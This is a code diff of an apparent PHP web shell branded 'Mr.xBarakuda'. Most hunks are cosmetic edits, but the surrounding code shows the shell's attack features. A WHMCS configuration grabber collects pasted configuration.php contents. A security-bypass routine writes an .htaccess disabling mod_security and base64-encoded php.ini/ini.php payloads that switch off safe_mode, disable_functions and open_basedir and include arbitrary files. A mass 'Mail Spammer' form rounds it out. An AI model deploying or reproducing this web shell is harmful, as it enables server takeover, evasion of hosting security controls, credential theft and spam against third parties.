@@ -516,16 +516,13 @@ else {
 }
 echo "<center>";
 echo "<pre onkeydown='return false;' onmousedown='return false;' class='kedip'>
-
-  __  __           ____                  _              _       
- |  \/  |         |  _ \                | |            | |      
- | \  / |_ ____  _| |_) | __ _ _ __ __ _| | ___   _  __| | __ _ 
- | |\/| | '__\ \/ /  _ < / _` | '__/ _` | |/ / | | |/ _` |/ _` |
- | |  | | |_  >  <| |_) | (_| | | | (_| |   <| |_| | (_| | (_| |
- |_|  |_|_(_)/_/\_\____/ \__,_|_|  \__,_|_|\_\\__,_|\__,_|\__,_|
-                                                                
-                                                                
-                                           
+___  ___         ______                 _              _       
+|  \/  |         | ___ \               | |            | |      
+| .  . |_ ____  _| |_/ / __ _ _ __ __ _| | ___   _  __| | __ _ 
+| |\/| | '__\ \/ / ___ \/ _` | '__/ _` | |/ / | | |/ _` |/ _` |
+| |  | | |_  >  <| |_/ / (_| | | | (_| |   <| |_| | (_| | (_| |
+\_|  |_/_(_)/_/\_\____/ \__,_|_|  \__,_|_|\_\\__,_|\__,_|\__,_|
+                                                               
 </pre>";
 echo "</center>";
 echo "<hr color=deepskyblue>";
@@ -542,7 +539,7 @@ echo "Time On Server: <font color=deepskyblue>" . date("d-M-Y / h:i a") . "</fon
 echo "Safe Mode: " . $sm . "<br>";
 echo "Disable Functions: " . $ds . "<br>";
 echo "file_get_contents: " . $fget . " | magic_quotes_gpc: " . $magico . "<br>";
-echo "MySQL: " . $mysql . " | MsSQL: " . $mssql . " | PostgreSQL: " . $pgsql . " | Perl: " . $perl . " | Python: " . $python . " | Wget: " . $wget . " | cURL: " . $curl . " | Oracle: " . $orac . "<br>";
+echo "MySQL: " . $mysql . " | MsSQL: " . $mssql . " | PostgreSQL: " . $pgsql . " | Perl: " . $perl . " | Python: " . $python . " | wGet: " . $wget . " | cURL: " . $curl . " | Oracle: " . $orac . "<br>";
 echo "CWD: ";
 foreach ($scdir as $c_dir => $cdir) {
  echo "<a href='?dir=";
@@ -642,9 +639,9 @@ if ($_GET['whmcs'] == 'killer') {
       <center>
         <br><u>Input WHMCS configuration.php</u><br><textarea cols="60" name="azztssns" rows="20"></textarea><br><br><input name="conf" size="10"
           value="Fuck it!!!" type="submit">
-        <br/>
-    </form>
-    </center>';
+        <br>
+        </center>
+        </form>';
  if ($_POST['conf']) {
   $configuration = $_POST['azztssns'];
   file_put_contents("configuration.php", $configuration, FILE_APPEND);
@@ -1602,11 +1599,11 @@ elseif ($_GET['bypass'] == 'disablefunc') {
   $file = fopen(".htaccess", "w");
   echo fwrite($file, "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
   fclose($file);
-  echo " htaccess successfully created!";
+  echo " .htaccess successfully created!";
  }
  if (isset($_POST['litini'])) {
   $iniph = "PD9waHANCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsiZmlsZSJdKTsNCmluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsic3MiXTsNCj8+";
-  $byph = "c2FmZV9tb2RlID0gT0ZGXG5kaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkVcbnNhZmVfbW9kZV9naWQgPSBPRkZcbm9wZW5fYmFzZWRpciA9IE9GRg==";
+  $byph = "c2FmZV9tb2RlID0gT0ZGXG5kaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkVcbnNhZmVfbW9kZV9naWQgPSBPRkZcbnNhZmVfbW9kZV9pbmNsdWRlX2RpciA9IE9GRlxub3Blbl9iYXNlZGlyID0gT0ZG";
   $comp = "PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPlxuU2VjRmlsdGVyRW5naW5lIE9mZlxuU2VjRmlsdGVyU2NhblBPU1QgT2ZmXG48L0lmTW9kdWxlPg==";
   file_put_contents("php.ini", base64_decode($byph));
   file_put_contents("ini.php", base64_decode($iniph));
@@ -1623,16 +1620,14 @@ elseif ($_GET['do'] == 'spam_mail') {
   $Message = $_POST['msgmail'];
   $Count = $_POST['ctmail'];
   if (isset($_POST['htmlcontents'])) {
-   $headers = "From: " . $_POST['frname'] . " <" . $FromEmail . ">rn";
-   $headers .= "MIME-Version: 1.0rn";
-   $headers .= "Content-Type: text/html; charset=ISO-8859-1rn";
-   $linenterr = '<br/>-<br/>';
+   $headers = "From: " . $_POST['frname'] . " <" . $FromEmail . ">\r\n";
+   $headers .= "MIME-Version: 1.0\r\n";
+   $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
+   $linenterr = '<br>-<br>';
   }
   else {
    $headers = "From: " . $_POST['frname'] . " <" . $FromEmail . ">";
-   $linenterr = '
--
-';
+   $linenterr = '-';
   }
   $i = 1;
   while ($i <= $Count) {
@@ -1656,20 +1651,20 @@ elseif ($_GET['do'] == 'spam_mail') {
  else {
   echo '<form method="post">
 <center><h3>Mail Spammer</h3>
-<p>Gunakan Email Pengirim Yang Asli Agar Pesan Tidak Dianggap Spam</p><br/>
-Sender Email:<br/>
-<input type="email" size="40" name="fremail" placeholder="kuda@email.com" value="' . htmlspecialchars($_POST['fremail']) . '"><br/><br/>
-Sender Name:<br/>
-<input type="text" size="40" name="frname" placeholder="Unknown" value="' . htmlspecialchars($_POST['frname']) . '"><br/><br/>
-Target Email:<br/>
-<input type="email" size="40" name="tremail" placeholder="to@email.com" value="' . htmlspecialchars($_POST['tremail']) . '"><br/><br/>
-Subject:<br/>
-<input type="text" size="40" name="subjectt" placeholder="Maqlo Heker.." value="' . htmlspecialchars($_POST['subjectt']) . '"><br/><br/>
-Message:<br/>
-<textarea cols="30" rows="8" name="msgmail" placeholder="gue gans, tq.">' . htmlspecialchars($_POST['msgmail']) . '</textarea><br/><br/>
-Spam Count:<br/>
-<input type="number" size="40" name="ctmail" placeholder="10" value="' . htmlspecialchars($_POST['ctmail']) . '"><br/><br/>
-<input type="checkbox" name="htmlcontents" value="HTML Contents">HTML Contents:<br/><br/>
+<p>Gunakan Email Pengirim Yang Asli Agar Pesan Tidak Dianggap Spam</p><br>
+Sender Email:<br>
+<input type="email" size="40" name="fremail" placeholder="kuda@email.com" value="' . htmlspecialchars($_POST['fremail']) . '"><br><br>
+Sender Name:<br>
+<input type="text" size="40" name="frname" placeholder="Unknown" value="' . htmlspecialchars($_POST['frname']) . '"><br><br>
+Target Email:<br>
+<input type="email" size="40" name="tremail" placeholder="to@email.com" value="' . htmlspecialchars($_POST['tremail']) . '"><br><br>
+Subject:<br>
+<input type="text" size="40" name="subjectt" placeholder="Maqlo Heker.." value="' . htmlspecialchars($_POST['subjectt']) . '"><br><br>
+Message:<br>
+<textarea cols="30" rows="8" name="msgmail" placeholder="gue gans, tq.">' . htmlspecialchars($_POST['msgmail']) . '</textarea><br><br>
+Spam Count:<br>
+<input type="number" size="40" name="ctmail" placeholder="10" value="' . htmlspecialchars($_POST['ctmail']) . '"><br><br>
+<input type="checkbox" name="htmlcontents" value="HTML Contents">HTML Contents:<br><br>
 <input type="submit" name="oksend" value="Send!"></form></center>';
  }
 }
